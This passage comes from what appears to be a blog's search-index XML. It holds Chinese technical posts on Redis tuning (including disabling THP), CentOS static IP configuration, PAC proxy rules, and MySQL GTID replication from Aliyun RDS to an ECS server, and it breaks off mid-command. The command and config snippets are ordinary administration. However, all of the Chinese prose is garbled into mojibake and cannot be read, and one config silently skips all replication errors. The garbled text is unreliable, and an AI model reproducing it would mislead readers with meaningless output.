è¡¨ç¤ºä»è®¾ç½®äº†è¿‡æœŸé”®çš„é”®å€¼ä¸­æ·˜æ±°æ•°æ®ã€‚<br>å¯ä»¥æ ¹æ®å®é™…çš„ä¸šåŠ¡æƒ…å†µè¿›è¡Œè®¾ç½®ï¼Œé»˜è®¤çš„æ·˜æ±°ç­–ç•¥ä¸æ·˜æ±°ä»»ä½•æ•°æ®ï¼Œåœ¨æ–°å¢æ—¶ä¼šæŠ¥é”™ã€‚</p><h3 id="æ··åˆæŒä¹…åŒ–"><a href="#æ··åˆæŒä¹…åŒ–" class="headerlink" title="æ··åˆæŒä¹…åŒ–"></a>æ··åˆæŒä¹…åŒ–</h3><p>Redis çš„æŒä¹…åŒ–ç­–ç•¥æ˜¯å°†å†…å­˜æ•°æ®å¤åˆ¶åˆ°ç¡¬ç›˜ä¸Šï¼Œè¿™æ ·æ‰å¯ä»¥è¿›è¡Œå®¹ç¾æ¢å¤æˆ–è€…æ•°æ®è¿ç§»ï¼Œä½†ç»´æŠ¤æ­¤æŒä¹…åŒ–çš„åŠŸèƒ½ï¼Œéœ€è¦å¾ˆå¤§çš„æ€§èƒ½å¼€é”€ã€‚<br>åœ¨ Redis 4.0 ä¹‹åï¼ŒRedis æœ‰ 3 ç§æŒä¹…åŒ–çš„æ–¹å¼ï¼š</p><ul><li>RDBï¼ˆRedis DataBaseï¼Œå¿«ç…§æ–¹å¼ï¼‰å°†æŸä¸€ä¸ªæ—¶åˆ»çš„å†…å­˜æ•°æ®ï¼Œä»¥äºŒè¿›åˆ¶çš„æ–¹å¼å†™å…¥ç£ç›˜ï¼›</li><li>AOFï¼ˆAppend Only Fileï¼Œæ–‡ä»¶è¿½åŠ æ–¹å¼ï¼‰ï¼Œè®°å½•æ‰€æœ‰çš„æ“ä½œå‘½ä»¤ï¼Œå¹¶ä»¥æ–‡æœ¬çš„å½¢å¼è¿½åŠ åˆ°æ–‡ä»¶ä¸­ï¼›</li><li>æ··åˆæŒä¹…åŒ–æ–¹å¼ï¼ŒRedis 4.0 ä¹‹åæ–°å¢çš„æ–¹å¼ï¼Œæ··åˆæŒä¹…åŒ–æ˜¯ç»“åˆäº† RDB å’Œ AOF çš„ä¼˜ç‚¹ï¼Œåœ¨å†™å…¥çš„æ—¶å€™ï¼Œå…ˆæŠŠå½“å‰çš„æ•°æ®ä»¥ RDB çš„å½¢å¼å†™å…¥æ–‡ä»¶çš„å¼€å¤´ï¼Œå†å°†åç»­çš„æ“ä½œå‘½ä»¤ä»¥ AOF çš„æ ¼å¼å­˜å…¥æ–‡ä»¶ï¼Œè¿™æ ·æ—¢èƒ½ä¿è¯ Redis é‡å¯æ—¶çš„é€Ÿåº¦ï¼Œåˆèƒ½å‡ä½æ•°æ®ä¸¢å¤±çš„é£é™©ã€‚</li></ul><p>RDB å’Œ AOF æŒä¹…åŒ–å„æœ‰åˆ©å¼Šï¼ŒRDB å¯èƒ½ä¼šå¯¼è‡´ä¸€å®šæ—¶é—´å†…çš„æ•°æ®ä¸¢å¤±ï¼Œè€Œ AOF ç”±äºæ–‡ä»¶è¾ƒå¤§åˆ™ä¼šå½±å“ Redis çš„å¯åŠ¨é€Ÿåº¦ï¼Œä¸ºäº†èƒ½åŒæ—¶æ‹¥æœ‰ RDB å’Œ AOF çš„ä¼˜ç‚¹ï¼ŒRedis 4.0 ä¹‹åæ–°å¢äº†æ··åˆæŒä¹…åŒ–çš„æ–¹å¼ï¼Œå› æ­¤æˆ‘ä»¬åœ¨å¿…é¡»è¦è¿›è¡ŒæŒä¹…åŒ–æ“ä½œæ—¶ï¼Œåº”è¯¥é€‰æ‹©æ··åˆæŒä¹…åŒ–çš„æ–¹å¼ã€‚<br>æŸ¥è¯¢æ˜¯å¦å¼€å¯æ··åˆæŒä¹…åŒ–å¯ä»¥ä½¿ç”¨ <code>config get aof-use-rdb-preamble</code> å‘½ä»¤</p><h3 id="ç¦ç”¨-THP-ç‰¹æ€§"><a href="#ç¦ç”¨-THP-ç‰¹æ€§" class="headerlink" title="ç¦ç”¨ THP ç‰¹æ€§"></a>ç¦ç”¨ THP ç‰¹æ€§</h3><p>Linux kernel åœ¨ 2.6.38 å†…æ ¸å¢åŠ äº† Transparent Huge Pages (THP) ç‰¹æ€§ ï¼Œæ”¯æŒå¤§å†…å­˜é¡µ 2MB åˆ†é…ï¼Œé»˜è®¤å¼€å¯ã€‚<br>å½“å¼€å¯äº† THP æ—¶ï¼Œfork çš„é€Ÿåº¦ä¼šå˜æ…¢ï¼Œfork ä¹‹åæ¯ä¸ªå†…å­˜é¡µä»åŸæ¥ 4KB å˜ä¸º 2MBï¼Œä¼šå¤§å¹…å¢åŠ é‡å†™æœŸé—´çˆ¶è¿›ç¨‹å†…å­˜æ¶ˆè€—ã€‚åŒæ—¶æ¯æ¬¡å†™å‘½ä»¤å¼•èµ·çš„å¤åˆ¶å†…å­˜é¡µå•ä½æ”¾å¤§äº† 512 å€ï¼Œä¼šæ‹–æ…¢å†™æ“ä½œçš„æ‰§è¡Œæ—¶é—´ï¼Œå¯¼è‡´å¤§é‡å†™æ“ä½œæ…¢æŸ¥è¯¢ã€‚ä¾‹å¦‚ç®€å•çš„ incr å‘½ä»¤ä¹Ÿä¼šå‡ºç°åœ¨æ…¢æŸ¥è¯¢ä¸­ï¼Œå› æ­¤ Redis å»ºè®®å°†æ­¤ç‰¹æ€§è¿›è¡Œç¦ç”¨ï¼Œç¦ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> never &gt; Â /sys/kernel/mm/transparent_hugepage/enabled</span><br></pre></td></tr></table></figure><p>ä¸ºäº†ä½¿æœºå™¨é‡å¯å THP é…ç½®ä¾ç„¶ç”Ÿæ•ˆï¼Œå¯ä»¥åœ¨ <code>/etc/rc.local</code> ä¸­è¿½åŠ  <code>echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</code>ã€‚</p><h3 id="ä½¿ç”¨åˆ†å¸ƒå¼æ¶æ„"><a href="#ä½¿ç”¨åˆ†å¸ƒå¼æ¶æ„" class="headerlink" title="ä½¿ç”¨åˆ†å¸ƒå¼æ¶æ„"></a>ä½¿ç”¨åˆ†å¸ƒå¼æ¶æ„</h3><p>Redis åˆ†å¸ƒå¼æ¶æ„æœ‰ä¸‰ä¸ªé‡è¦çš„æ‰‹æ®µï¼š</p><ul><li>ä¸»ä»åŒæ­¥</li><li>å“¨å…µæ¨¡å¼</li><li>Redis Cluster é›†ç¾¤</li></ul><p>ä½¿ç”¨ä¸»ä»åŒæ­¥åŠŸèƒ½æˆ‘ä»¬å¯ä»¥æŠŠå†™å…¥æ”¾åˆ°ä¸»åº“ä¸Šæ‰§è¡Œï¼ŒæŠŠè¯»åŠŸèƒ½è½¬ç§»åˆ°ä»æœåŠ¡ä¸Šï¼Œå› æ­¤å°±å¯ä»¥åœ¨å•ä½æ—¶é—´å†…å¤„ç†æ›´å¤šçš„è¯·æ±‚ï¼Œä»è€Œæå‡çš„ Redis æ•´ä½“çš„è¿è¡Œé€Ÿåº¦ã€‚</p><p>è€Œå“¨å…µæ¨¡å¼æ˜¯å¯¹äºä¸»ä»åŠŸèƒ½çš„å‡çº§ï¼Œä½†å½“ä¸»èŠ‚ç‚¹å¥”æºƒä¹‹åï¼Œæ— éœ€äººå·¥å¹²é¢„å°±èƒ½è‡ªåŠ¨æ¢å¤ Redis çš„æ­£å¸¸ä½¿ç”¨ã€‚</p><p>Redis Cluster æ˜¯ Redis 3.0 æ­£å¼æ¨å‡ºçš„ï¼ŒRedis é›†ç¾¤æ˜¯é€šè¿‡å°†æ•°æ®åº“åˆ†æ•£å­˜å‚¨åˆ°å¤šä¸ªèŠ‚ç‚¹ä¸Šæ¥å¹³è¡¡å„ä¸ªèŠ‚ç‚¹çš„è´Ÿè½½å‹åŠ›ã€‚</p><p>Redis Cluster é‡‡ç”¨è™šæ‹Ÿå“ˆå¸Œæ§½åˆ†åŒºï¼Œæ‰€æœ‰çš„é”®æ ¹æ®å“ˆå¸Œå‡½æ•°æ˜ å°„åˆ° 0 ~ 16383 æ•´æ•°æ§½å†…ï¼Œè®¡ç®—å…¬å¼ï¼šslot = CRC16(key) &amp; 16383ï¼Œæ¯ä¸€ä¸ªèŠ‚ç‚¹è´Ÿè´£ç»´æŠ¤ä¸€éƒ¨åˆ†æ§½ä»¥åŠæ§½æ‰€æ˜ å°„çš„é”®å€¼æ•°æ®ã€‚è¿™æ · Redis å°±å¯ä»¥æŠŠè¯»å†™å‹åŠ›ä»ä¸€å°æœåŠ¡å™¨ï¼Œåˆ†æ•£ç»™å¤šå°æœåŠ¡å™¨äº†ï¼Œå› æ­¤æ€§èƒ½ä¼šæœ‰å¾ˆå¤§çš„æå‡ã€‚</p><p>åœ¨è¿™ä¸‰ä¸ªåŠŸèƒ½ä¸­ï¼Œåªéœ€è¦ä½¿ç”¨ä¸€ä¸ªå°±è¡Œäº†ï¼Œæ¯«æ— ç–‘é—® Redis Cluster åº”è¯¥æ˜¯é¦–é€‰çš„å®ç°æ–¹æ¡ˆï¼Œå®ƒå¯ä»¥æŠŠè¯»å†™å‹åŠ›è‡ªåŠ¨çš„åˆ†æ‹…ç»™æ›´å¤šçš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”æ‹¥æœ‰è‡ªåŠ¨å®¹ç¾çš„èƒ½åŠ›ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¾ç½®CentOSæœåŠ¡å™¨IPåœ°å€</title>
      <link href="post/33748/"/>
      <url>post/33748/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å¦‚ä½•åœ¨CentOSæœåŠ¡å™¨ä¸­é…ç½®ç½‘ç»œIPåœ°å€</p><span id="more"></span><h3 id="è®¾ç½®IPåœ°å€"><a href="#è®¾ç½®IPåœ°å€" class="headerlink" title="è®¾ç½®IPåœ°å€"></a>è®¾ç½®IPåœ°å€</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/sysconfig/network-scripts/</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹é…ç½®ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘ç½‘å¡é…ç½®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ifcfg-eno1</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘ä¿¡æ¯ï¼Œå»ºè®® <code>ONBOOT=yes</code>ï¼Œä»¥åå¼€æœºå°±ä¼šè‡ªåŠ¨è”ç½‘ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">TYPE</span>=<span class="string">&quot;Ethernet&quot;</span></span><br><span class="line"><span class="attr">BOOTPROTO</span>=<span class="string">&quot;none&quot;</span></span><br><span class="line"><span class="attr">DEFROUTE</span>=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="attr">IPV4_FAILURE_FATAL</span>=<span class="string">&quot;no&quot;</span></span><br><span class="line"><span class="attr">IPV6INIT</span>=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="attr">IPV6_AUTOCONF</span>=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="attr">IPV6_DEFROUTE</span>=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="attr">IPV6_FAILURE_FATAL</span>=<span class="string">&quot;no&quot;</span></span><br><span class="line"><span class="attr">NAME</span>=<span class="string">&quot;eno1&quot;</span></span><br><span class="line"><span class="attr">UUID</span>=<span class="string">&quot;c63850e5-4c25-46c7-a030-574fcf824ad5&quot;</span></span><br><span class="line"><span class="attr">DEVICE</span>=<span class="string">&quot;eno1&quot;</span> <span class="comment">#è®¾å¤‡åˆ«å</span></span><br><span class="line"><span class="attr">ONBOOT</span>=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="attr">IPADDR1</span>=<span class="number">202.95</span>.<span class="number">22.222</span> <span class="comment">#ä»IPåœ°å€1</span></span><br><span class="line"><span class="attr">PREFIX1</span>=<span class="string">&quot;25&quot;</span></span><br><span class="line"><span class="attr">IPADDR2</span>=<span class="number">202.95</span>.<span class="number">22.233</span> <span class="comment">#ä»IPåœ°å€2</span></span><br><span class="line"><span class="attr">PREFIX2</span>=<span class="string">&quot;25&quot;</span></span><br><span class="line"><span class="attr">DNS1</span>=<span class="string">&quot;8.8.8.8&quot;</span> <span class="comment">#DNSæœåŠ¡å™¨</span></span><br><span class="line"><span class="attr">IPADDR</span>=<span class="number">202.95</span>.<span class="number">22.212</span>  <span class="comment">#è®¾ç½®ä¸»IPåœ°å€</span></span><br><span class="line"><span class="attr">PREFIX</span>=<span class="number">25</span></span><br><span class="line"><span class="attr">GATEWAY</span>=<span class="number">202.95</span>.<span class="number">8.129</span> <span class="comment">#ç½‘å…³</span></span><br><span class="line"><span class="attr">IPV6_PEERDNS</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">IPV6_PEERROUTES</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">IPV6_PRIVACY</span>=<span class="literal">no</span></span><br></pre></td></tr></table></figure><h3 id="é‡å¯ç½‘ç»œé…ç½®"><a href="#é‡å¯ç½‘ç»œé…ç½®" class="headerlink" title="é‡å¯ç½‘ç»œé…ç½®"></a>é‡å¯ç½‘ç»œé…ç½®</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PACè§„åˆ™é…ç½®</title>
      <link href="post/57233/"/>
      <url>post/57233/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>è®¿é—®githubåŠ è½½è¿‡æ…¢ï¼Œä¸‹è½½é¡¹ç›®å¥‡æ…¢æ— æ¯”ï¼Œå¼€å¯å…¨å±€åå¯ä»¥ç§’ä¸‹ï¼Œååº”è¿‡æ¥github.comé»˜è®¤æ²¡æœ‰èµ°ä»£ç†ï¼Œæ•´ç†äº†ä¸€äº›PACè§„åˆ™çš„åŸºæœ¬é…ç½®</p><span id="more"></span><h3 id="åŸºæœ¬è§„åˆ™"><a href="#åŸºæœ¬è§„åˆ™" class="headerlink" title="åŸºæœ¬è§„åˆ™"></a>åŸºæœ¬è§„åˆ™</h3><ul><li><p>é€šé…ç¬¦æ”¯æŒï¼Œå¦‚ <code>*.example.com/*</code> å®é™…ä¹¦å†™æ—¶å¯çœç•¥ å¦‚ï¼š <code>.example.com/</code> æ„å³ <code>.example.com/*</code></p></li><li><p>æ­£åˆ™è¡¨è¾¾å¼æ”¯æŒï¼Œä»¥ <code>\</code> å¼€å§‹å’Œç»“æŸï¼Œ å¦‚ï¼š <code>\[\w]+:\/\/example.com\</code></p></li><li><p>ä¾‹å¤–è§„åˆ™ <code>@@</code>ï¼Œå¦‚ <code>@@*.example.com/*</code> æ»¡è¶³ <code>@@</code> åè§„åˆ™çš„åœ°å€ä¸ä½¿ç”¨ä»£ç†</p></li><li><p>åŒ¹é…åœ°å€å¼€å§‹å’Œç»“å°¾ <code>|</code>ï¼Œå¦‚ï¼š <code>|http://example.com</code>ã€<code>example.com|</code> åˆ†åˆ«è¡¨ç¤ºä»¥ <code>http://example.com</code> å¼€å§‹å’Œä»¥ <code>example.com</code> ç»“æŸçš„åœ°å€</p></li><li><p>|| æ ‡è®°ï¼Œå¦‚ï¼š <code>||example.com</code> åˆ™ <code>http://example.com</code> ã€<code>https://example.com</code> ã€<code>ftp://example.com</code> ç­‰åœ°å€å‡æ»¡è¶³æ¡ä»¶ï¼Œåªç”¨äºåŒ¹é…åœ°å€å¼€å¤´</p></li><li><p>æ³¨é‡Š <code>!</code> å¦‚ï¼š <code>! Comment</code></p></li><li><p>åˆ†éš”ç¬¦ <code>^</code>ï¼Œè¡¨ç¤ºé™¤äº†å­—æ¯ã€æ•°å­—æˆ–è€… <code>_ - . %</code> ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦å¦‚ï¼š <code>http://example.com^</code> ï¼Œ<code>http://example.com/</code> å’Œ <code>http://example.com:8000/</code> å‡æ»¡è¶³æ¡ä»¶ï¼Œè€Œ <code>http://example.com.ar/</code> ä¸æ»¡è¶³æ¡ä»¶</p></li></ul><h3 id="è‡ªå®šä¹‰è§„åˆ™"><a href="#è‡ªå®šä¹‰è§„åˆ™" class="headerlink" title="è‡ªå®šä¹‰è§„åˆ™"></a>è‡ªå®šä¹‰è§„åˆ™</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">! Put user rules line by line in this file.</span><br><span class="line"></span><br><span class="line">! See https://adblockplus.org/en/filter-cheatsheet</span><br><span class="line"></span><br><span class="line">@@||localhost</span><br><span class="line"></span><br><span class="line">||github.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸€è¡Œåªèƒ½æœ‰ä¸€æ¡ä»£ç†è§„åˆ™ï¼Œç”Ÿæ•ˆåè¢«é…ç½®çš„åŸŸååŠå…¶å­åŸŸåéƒ½ä¼šç»è¿‡ä»£ç†è®¿é—®</p>]]></content>
      
      
      <categories>
          
          <category> ç§‘å­¦ä¸Šç½‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é˜¿é‡Œäº‘RDSä¸ECSæœåŠ¡å™¨æ•°æ®åº“åšä¸»ä»</title>
      <link href="post/13832/"/>
      <url>post/13832/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å®ç°RDS for mysqlä¸çº¿ä¸‹ECSä¸Šè‡ªå»ºæ•°æ®åº“æ•°æ®å®æ—¶åŒæ­¥ï¼Œé˜¿é‡Œäº‘å®˜æ–¹æ¨èä½¿ç”¨DTSæ–¹å¼è¿›è¡Œã€‚åŸå› æœ‰ä¸¤ä¸ªï¼š</p><ul><li><p>mysql-binæ­£å¸¸æƒ…å†µä¸‹,RDSåœ¨æœ¬åœ°åªä¿å­˜18ä¸ªå°æ—¶</p></li><li><p>å½“RDSå®ä¾‹åˆ‡æ¢æ—¶ï¼Œä¼šå½±å“è‡ªå»ºECSæ•°æ®åŒæ­¥(è¿™ä¸ªç»è¿‡æµ‹è¯•å¯ä»¥æ’é™¤)</p></li></ul><p>è€ƒè™‘åˆ°ä½¿ç”¨DTSå·¥å…·ä¼šäº§ç”Ÿä¸å°‘çš„è´¹ç”¨(é•¿æœŸä½¿ç”¨)ï¼Œå¦ä¸€æ–¹é¢ï¼Œåœ¨æ•°æ®åº“ä¸­ä¸€ä¸ªåœ°åŒºå¯¹åº”ä¸€ä¸ªåº“ï¼Œåç»­ä¸šåŠ¡æ— æ³•äº‹å…ˆè§„åˆ’å¥½åº“åï¼Œæ­¤æ—¶å¦‚æœä½¿ç”¨dtså¯èƒ½éœ€è¦è´­ä¹°å¤šä¸ªé€šé“ï¼Œè¿›è¡Œé…ç½®ï¼Œæ¯”è¾ƒè´¹æ—¶è´¹åŠ›ä¸”è´¹é’±ã€‚åŸºäºè¿™ä¸¤ä¸ªåŸå› çš„è€ƒè™‘ï¼Œå†³å®šä½¿ç”¨æ­å»ºä¸»ä»å¤åˆ¶æ–¹å¼æ¥å®ç°æ•°æ®åŒæ­¥</p><span id="more"></span><h3 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h3><p>ä¼ ç»Ÿçš„MYSQLä¸»ä»å°±æ˜¯ä¸»åº“æ¯åšä¸€ä¸ªæ“ä½œä¼šåœ¨binlogä¸Šåšä¸€ä¸ªpositionï¼Œæ¯åšä¸€ä¸ªeventå°±åœ¨binlogåšä¸€ä¸ªèµ·å§‹ç¼–å·ã€ä¸€ä¸ªç»ˆæ­¢ç¼–å·ã€‚ç„¶åä¸»åº“æŠŠbinlogä¼ é€’ç»™ä»åº“ï¼Œç„¶åä»åº“æ ¹æ®è¿™ä¸ªbinlogçš„poså€¼å°±æŒ‰ç…§é¡ºåºåšä¸€æ ·çš„æ“ä½œï¼Œè¾¾åˆ°ä¸¤ä¸ªæ•°æ®åº“ä¿æŒä¸€è‡´çš„ç›®çš„ã€‚</p><p>GTIDä¸ç”¨è¿™ä¸ªpositionçš„æ–¹å¼ï¼Œè€Œæ˜¯ç”¨äº†å…¨å±€äº‹ç‰©æ ‡è¯†ï¼Œè¿™ä¸ªæ ‡è¯†çš„æ ¼å¼æ˜¯<code>source_id:transaction_id</code>ï¼Œå¦‚<code>3E11FA47-71CA-11E1-9E33-C80AA9429562:23</code></p><ul><li><p>source_idå³æ˜¯server_uuidï¼Œåœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶ç”Ÿæˆ(å‡½æ•° generate_server_uuid)ï¼Œå¹¶æŒä¹…åŒ–åˆ°DATADIR/auto.cnfæ–‡ä»¶é‡Œ</p></li><li><p>transaction_idæ˜¯é¡ºåºåŒ–çš„åºåˆ—å·(sequence number)ï¼Œåœ¨æ¯å° MySQL æœåŠ¡å™¨ä¸Šéƒ½æ˜¯ä» 1 å¼€å§‹è‡ªå¢é•¿çš„åºåˆ—ï¼Œæ˜¯äº‹åŠ¡çš„å”¯ä¸€æ ‡è¯†</p></li></ul><p>å®ƒçš„ä¸»ä»è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼šä¸»åº“æ›´æ–°æ•°æ®æ—¶ï¼Œä¼šåœ¨äº‹åŠ¡å‰äº§ç”ŸGTIDï¼Œè¿é€šsqlè®°å½•åˆ°binlogæ—¥å¿—ä¸­ã€‚ä»åº“çš„i/oçº¿ç¨‹å°†å˜æ›´çš„binlogå†™å…¥åˆ°relay logä¸­ï¼Œè¯»å–å€¼æ˜¯æ ¹æ®gitd_nextå˜é‡ï¼Œå‘Šè¯‰ä»åº“ä¸‹ä¸€ä¸ªæ‰§è¡Œå“ªä¸ªGTIDã€‚ä»åº“çš„sqlçº¿ç¨‹ä»relay logä¸­è·å–GTIDï¼Œç„¶åå¯¹æ¯”ä»åº“çš„çš„binlogæ˜¯å¦æœ‰è®°å½•ã€‚å¦‚æœæœ‰è®°å½•ï¼Œè¯´æ˜è¯¥GTIDçš„äº‹åŠ¡å·²ç»æ‰§è¡Œï¼Œä»åº“ä¼šå¿½ç•¥ã€‚å¦‚æœæ²¡æœ‰è®°å½•ï¼Œä»åº“å°±ä¼šä»relay logä¸­æ‰§è¡Œè¯¥GTIDçš„äº‹åŠ¡ï¼Œå¹¶è®°å½•åˆ°ä»åº“binlogã€‚åœ¨è§£æè¿‡ç¨‹ä¸­ä¼šåˆ¤æ–­æ˜¯å¦æœ‰ä¸»é”®ï¼Œå¦‚æœæ²¡æœ‰å°±ç”¨äºŒçº§ç´¢å¼•ï¼Œå¦‚æœæ²¡æœ‰äºŒçº§ç´¢å¼•å°±ç”¨å…¨éƒ¨æ‰«æã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®ºæ˜¯çº§è”æƒ…å†µï¼Œè¿˜æ˜¯ä¸€ä¸»å¤šä»æƒ…å†µï¼Œéƒ½å¯ä»¥é€šè¿‡GTIDè‡ªåŠ¨æ‰¾ç‚¹å„¿ï¼Œè€Œæ— éœ€åƒä¹‹å‰é‚£æ ·é€šè¿‡binlogå’Œbinlog_positionæ‰¾ç‚¹å„¿äº†</p><h3 id="RDSæ•°æ®åº“é…ç½®"><a href="#RDSæ•°æ®åº“é…ç½®" class="headerlink" title="RDSæ•°æ®åº“é…ç½®"></a>RDSæ•°æ®åº“é…ç½®</h3><ul><li>é…ç½®ä»å®ä¾‹è¯»å–æ•°æ®ä½¿ç”¨çš„åªè¯»è´¦å·å’Œæˆæƒæ•°æ®åº“</li><li>å°†ECSçš„ä»å®ä¾‹çš„ IP åœ°å€åŠ å…¥ä¸»å®ä¾‹çš„ IP ç™½åå•ä¸­</li><li>ç™»å½•ä¸»å®ä¾‹</li></ul><h4 id="æŸ¥è¯¢-server-id"><a href="#æŸ¥è¯¢-server-id" class="headerlink" title="æŸ¥è¯¢ server-id"></a>æŸ¥è¯¢ server-id</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;server_id&#x27;;</span><br></pre></td></tr></table></figure><h4 id="æŸ¥è¯¢-GTID"><a href="#æŸ¥è¯¢-GTID" class="headerlink" title="æŸ¥è¯¢ GTID"></a>æŸ¥è¯¢ GTID</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;gtid_purged&#x27;;</span><br></pre></td></tr></table></figure><h3 id="ECSæ•°æ®åº“é…ç½®"><a href="#ECSæ•°æ®åº“é…ç½®" class="headerlink" title="ECSæ•°æ®åº“é…ç½®"></a>ECSæ•°æ®åº“é…ç½®</h3><h4 id="mysqlæ–‡ä»¶é…ç½®"><a href="#mysqlæ–‡ä»¶é…ç½®" class="headerlink" title="mysqlæ–‡ä»¶é…ç½®"></a>mysqlæ–‡ä»¶é…ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server-id = 1001 #ä¸å¯ä¸RDSä¸»åº“idç›¸åŒ</span><br><span class="line">port = 3306</span><br><span class="line">replicate-do-db = masterdb #éœ€è¦åŒæ­¥çš„æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">binlog_format = row #æ—¥å¿—æ–‡ä»¶æ ¼å¼</span><br><span class="line">log-bin = mysql-bin</span><br><span class="line">log-bin-index = mysql-bin.index</span><br><span class="line">relay-log = relay-log</span><br><span class="line">relay_log_index = relay-log.index</span><br><span class="line">slave-skip-errors = all</span><br></pre></td></tr></table></figure><h4 id="GTIDé…ç½®"><a href="#GTIDé…ç½®" class="headerlink" title="GTIDé…ç½®"></a>GTIDé…ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gtid_mode = on</span><br><span class="line">enforce_gtid_consistency = on</span><br><span class="line">log-slave-updates = 1</span><br><span class="line"></span><br><span class="line">sql_mode = NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br></pre></td></tr></table></figure><h4 id="ä»åº“é…ç½®"><a href="#ä»åº“é…ç½®" class="headerlink" title="ä»åº“é…ç½®"></a>ä»åº“é…ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; stop slave;</span><br><span class="line">mysql&gt; set global gtid_purged = &#x27;533ac4e6-9565-11e8-abb5-7cd30abca02e:1-3099396&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šè®¾ç½®gtid_purgedå€¼æ—¶ï¼Œgtid_executedå€¼å¿…é¡»ä¸ºç©ºå¦åˆ™æŠ¥é”™ï¼Œè¯¥å€¼æ¸…ç©ºçš„æ–¹æ³•å°±æ˜¯reset  masterå‘½ä»¤</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;reset master;</span><br></pre></td></tr></table></figure><h4 id="æ‰§è¡ŒåŒæ­¥"><a href="#æ‰§è¡ŒåŒæ­¥" class="headerlink" title="æ‰§è¡ŒåŒæ­¥"></a>æ‰§è¡ŒåŒæ­¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CHANGE MASTER TO</span><br><span 